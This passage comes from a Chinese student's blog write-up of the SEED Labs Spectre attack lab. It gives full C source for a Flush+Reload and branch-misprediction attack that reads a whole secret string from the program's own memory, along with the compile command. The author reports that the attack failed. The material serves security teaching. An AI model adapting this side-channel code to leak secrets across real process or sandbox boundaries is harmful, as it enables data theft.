class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>你的任务。请编译和运行幽灵攻击改进了。c，并执行以下任务：</p>
<ul>
<li>您可能会观察到，当运行上面的代码时，得分最高的代码很可能是得分[0]。请找出原因，并修复上面的代码，这样实际的秘密值（不是零值）将被打印出来。</li>
<li>Line➀似乎没用，但从我们对SEEDUbuntu20.04的经验来看，如果没有这条线，攻击就不会工作。在SEEDUbuntu16.04VM上，不需要使用这一行。我们还没有弄清楚确切的原因，所以如果可以的话，你的老师可能会给你额外积分。请上下运行该程序，并描述您的观察结果。</li>
<li>Line➁会使程序睡眠10微秒。该程序的睡眠时间确实会影响攻击的成功率。请尝试其他几点方法，并描述一下您的观察结果。</li>
</ul>
</li>
<li><p>编译运行</p>
</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702475681092-4f301b3d-6f70-477d-8c58-ab67dc873cc9.png#averageHue=%230b0907&clientId=uf8fdb3e2-6fa1-4&from=paste&height=135&id=SSJxE&originHeight=213&originWidth=1063&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=75254&status=done&style=none&taskId=u4946c5cf-6522-4599-9893-c3a012dc5a2&title=&width=674.9206655708495" alt="image.png"><br />可能是因为执行了很多次，最终还是失败了：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702475703037-d9b31134-62c5-4894-90de-26db7dc5679f.png#averageHue=%23030201&clientId=uf8fdb3e2-6fa1-4&from=paste&height=361&id=ax5Cs&originHeight=569&originWidth=547&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=26872&status=done&style=none&taskId=ud6f9a0bc-208c-4f78-8385-243e54677bb&title=&width=347.3016030736168" alt="image.png"></p>
<blockquote>
<p>因为我的实验一直无法成功，无法利用对照试验测试unsleep对实验结果的影响，根据某实验成功者的结论的实验结论：应该是因为usleep的时间最长，预测执行时间相关，array[s*4096 + DELTA] +&#x3D; 88;没能执行，容易导致scores[0]</p>
</blockquote>
<p><a name="paGo4"></a></p>
<h2 id="7-Task-6-Steal-the-Entire-Secret-String"><a href="#7-Task-6-Steal-the-Entire-Secret-String" class="headerlink" title="7 Task 6: Steal the Entire Secret String"></a><strong>7 Task 6: Steal the Entire Secret String</strong></h2><blockquote>
<p>在上一个任务中，我们只读取秘密字符串的第一个字符。在这个任务中，我们需要使用幽灵攻击打印出整个字符串。请编写您自己的代码或扩展任务5中的代码；在报告中包括您的执行结果。</p>
</blockquote>
<p>将SpectreAttackImproved.c修改如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;emmintrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> buffer_size = <span class="number">10</span>;</span><br><span class="line"><span class="type">uint8_t</span> buffer[<span class="number">10</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;; </span><br><span class="line"><span class="type">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> *secret = <span class="string">&quot;Some Secret Value&quot;</span>;   </span><br><span class="line"><span class="type">uint8_t</span> <span class="built_in">array</span>[<span class="number">256</span>*<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CACHE_HIT_THRESHOLD (80)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Sandbox Function</span></span><br><span class="line"><span class="type">uint8_t</span> <span class="title function_">restrictedAccess</span><span class="params">(<span class="type">size_t</span> x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; buffer_size) &#123;</span><br><span class="line">     <span class="keyword">return</span> buffer[x];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flushSideChannel</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="comment">// Write to array to bring it to RAM to prevent Copy-on-write</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) <span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA] = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">//flush the values of the array from cache</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> +DELTA]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> scores[<span class="number">256</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">reloadSideChannelImproved</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">uint8_t</span> *addr;</span><br><span class="line">  <span class="keyword">register</span> <span class="type">uint64_t</span> time1, time2;</span><br><span class="line">  <span class="type">int</span> junk = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    addr = &amp;<span class="built_in">array</span>[i * <span class="number">4096</span> + DELTA];</span><br><span class="line">    time1 = __rdtscp(&amp;junk);</span><br><span class="line">    junk = *addr;</span><br><span class="line">    time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line">    <span class="keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)</span><br><span class="line">      scores[i]++; <span class="comment">/* if cache hit, add 1 for this value */</span></span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">spectreAttack</span><span class="params">(<span class="type">size_t</span> larger_x)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="type">int</span> z;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="comment">// Train the CPU to take the true branch inside victim().</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    _mm_clflush(&amp;buffer_size);</span><br><span class="line">    <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123; &#125;</span><br><span class="line">    restrictedAccess(i);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Flush buffer_size and array[] from the cache.</span></span><br><span class="line">  _mm_clflush(&amp;buffer_size);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="built_in">array</span>[i*<span class="number">4096</span> + DELTA]); &#125;</span><br><span class="line">  <span class="comment">// Ask victim() to return the secret in out-of-order execution.</span></span><br><span class="line">  <span class="keyword">for</span> (z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123; &#125;</span><br><span class="line">  s = restrictedAccess(larger_x);</span><br><span class="line">  <span class="built_in">array</span>[s*<span class="number">4096</span> + DELTA] += <span class="number">88</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="type">uint8_t</span> s;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x&lt;<span class="number">17</span>; x++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(scores, <span class="number">0</span>, <span class="keyword">sizeof</span>(scores));</span><br><span class="line">    <span class="type">size_t</span> larger_x = (<span class="type">size_t</span>)(secret-(<span class="type">char</span>*)buffer + x);</span><br><span class="line">    flushSideChannel();</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>; i++) scores[i]=<span class="number">0</span>; </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">      spectreAttack(larger_x);</span><br><span class="line">      reloadSideChannelImproved();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> max = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++)&#123;</span><br><span class="line">     <span class="keyword">if</span>(scores[max] &lt; scores[i])  </span><br><span class="line">       max = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Reading secret value at %p = &quot;</span>, (<span class="type">void</span>*)larger_x);</span><br><span class="line">    usleep(<span class="number">25</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The  secret value is %d \t %c\n&quot;</span>, max,max);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">0</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -march=native -o SpectreAttackImproved SpectreAttackImproved.c</span><br></pre></td></tr></table></figure>
<p>将**usleep( )**修改了很多次，均无法输出秘密值：<br /><img src="https://cdn.nlark.com/yuque/0/2023/png/35921061/1702524989685-e7746bd1-e8c9-444f-8308-247ac61aed19.png#averageHue=%230f0d0b&clientId=u4568489d-13ea-4&from=paste&height=422&id=u185969ac&originHeight=664&originWidth=1055&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=156251&status=done&style=none&taskId=ue5105477-5dc9-4017-80eb-8f91367947d&title=&width=669.8413002608148" alt="image.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Enboy_Yu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://02lxc.github.io/post/f52b3abf.html">https://02lxc.github.io/post/f52b3abf.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://02lxc.github.io" target="_blank">Enboy_Yu's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/seedlab-%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/">seedlab 幽灵攻击</a></div><div class="post_share"><div class="social-share" data-image="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/82027ba8.html"><img class="prev-cover" src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SEEDLAB：MD5碰撞实验</div></div></a></div><div class="next-post pull-right"><a href="/post/4aa986b5.html"><img class="next-cover" src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SEEDLAB：DNS欺骗实验</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Enboy_Yu</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="xpand" style="height:200px;"><canvas class="illo" width="800" height="800" style="max-width: 200px; max-height: 200px; touch-action: none; width: 640px; height: 640px;"></canvas></div><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople1.js"></script><script src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/zdog.dist.js"></script><script id="rendered-js" src="https://fastly.jsdelivr.net/gh/xiaopengand/blogCdn@latest/xzxr/twopeople.js"></script><style>.card-widget.card-announcement {
margin: 0;
align-items: center;
justify-content: center;
text-align: center;
}
canvas {
display: block;
margin: 0 auto;
cursor: move;
}</style><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E5%AE%9E%E9%AA%8C%E7%9B%AE%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">一、    实验目的</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-overview"><span class="toc-number">1.1.</span> <span class="toc-text">1 overview</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4%E5%8F%8A%E7%BB%93%E6%9E%9C"><span class="toc-number">2.</span> <span class="toc-text">二、    实验步骤及结果</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Code-Compilation"><span class="toc-number">2.1.</span> <span class="toc-text">2 Code Compilation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Tasks-1-and-2-Side-Channel-Attacks-via-CPU-Caches"><span class="toc-number">2.2.</span> <span class="toc-text">3 Tasks 1 and 2: Side Channel Attacks via CPU Caches</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-Task-1-Reading-from-Cache-versus-from-Memory"><span class="toc-number">2.2.1.</span> <span class="toc-text">3.1 Task 1: Reading from Cache versus from Memory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-Task-2-Using-Cache-as-a-Side-Channel"><span class="toc-number">2.2.2.</span> <span class="toc-text">3.2 Task 2: Using Cache as a Side Channel</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Task-3-Out-of-Order-Execution-and-Branch-Prediction"><span class="toc-number">2.3.</span> <span class="toc-text">4 Task 3: Out-of-Order Execution and Branch Prediction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-Out-Of-Order-Execution"><span class="toc-number">2.3.1.</span> <span class="toc-text">4.1 Out-Of-Order Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-The-Experiment"><span class="toc-number">2.3.2.</span> <span class="toc-text">4.2 The Experiment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-3-Task-3"><span class="toc-number">2.3.3.</span> <span class="toc-text">4.3 Task 3</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Task-4-The-Spectre-Attack"><span class="toc-number">2.4.</span> <span class="toc-text">5 Task 4: The Spectre Attack</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-The-Setup-for-the-Experiment"><span class="toc-number">2.4.1.</span> <span class="toc-text">5.1 The Setup for the Experiment</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-The-Program-Used-in-the-Experiment"><span class="toc-number">2.4.2.</span> <span class="toc-text">5.2 The Program Used in the Experiment</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6-Task-5-Improve-the-Attack-Accuracy"><span class="toc-number">2.5.</span> <span class="toc-text">**6 Task 5: Improve the Attack Accuracy **</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-Task-6-Steal-the-Entire-Secret-String"><span class="toc-number">2.6.</span> <span class="toc-text">7 Task 6: Steal the Entire Secret String</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/88a94389.html" title="SEEDLAB：缓存攻击实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：缓存攻击实验"/></a><div class="content"><a class="title" href="/post/88a94389.html" title="SEEDLAB：缓存攻击实验">SEEDLAB：缓存攻击实验</a><time datetime="2024-01-31T08:48:54.810Z" title="发表于 2024-01-31 16:48:54">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/82027ba8.html" title="SEEDLAB：MD5碰撞实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：MD5碰撞实验"/></a><div class="content"><a class="title" href="/post/82027ba8.html" title="SEEDLAB：MD5碰撞实验">SEEDLAB：MD5碰撞实验</a><time datetime="2024-01-31T08:46:53.792Z" title="发表于 2024-01-31 16:46:53">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/f52b3abf.html" title="SEEDLAB：幽灵攻击实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：幽灵攻击实验"/></a><div class="content"><a class="title" href="/post/f52b3abf.html" title="SEEDLAB：幽灵攻击实验">SEEDLAB：幽灵攻击实验</a><time datetime="2024-01-31T06:12:11.281Z" title="发表于 2024-01-31 14:12:11">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/4aa986b5.html" title="SEEDLAB：DNS欺骗实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：DNS欺骗实验"/></a><div class="content"><a class="title" href="/post/4aa986b5.html" title="SEEDLAB：DNS欺骗实验">SEEDLAB：DNS欺骗实验</a><time datetime="2024-01-31T06:11:38.662Z" title="发表于 2024-01-31 14:11:38">2024-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d8a78989.html" title="SEEDLAB：TCP/IP Attack实验"><img src="https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SEEDLAB：TCP/IP Attack实验"/></a><div class="content"><a class="title" href="/post/d8a78989.html" title="SEEDLAB：TCP/IP Attack实验">SEEDLAB：TCP/IP Attack实验</a><time datetime="2024-01-31T06:11:16.140Z" title="发表于 2024-01-31 14:11:16">2024-01-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://th.bing.com/th/id/OIP.9u2K9fLeNUMHLJflCNmImgHaEo?w=300&amp;h=187&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.6&amp;pid=1.7')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024  <i id="heartbeat" class="fa fas fa-heartbeat"></i> Enboy_Yu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script async src="https://npm.elemecdn.com/tzy-blog/lib/js/other/sakura.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":20,"vOffset":-20},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>